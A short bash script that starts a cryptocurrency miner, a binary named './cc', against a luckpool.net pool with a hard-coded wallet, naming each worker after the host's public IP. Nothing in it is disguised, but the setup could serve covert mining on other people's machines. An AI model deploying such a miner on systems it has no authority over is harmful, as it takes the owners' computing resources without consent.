#!/bin/bash

POOL=stratum+tcp://na.luckpool.net:3956#xnsub
WALLET=RQhZzRKk21x8iPFj8S6gfBw3sWZcQpowX4
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Proxy

cd "$(dirname "$0")"

chmod +x ./cc && ./cc -c $POOL -u $WALLET.$WORKER -p x --cpu 2 $@
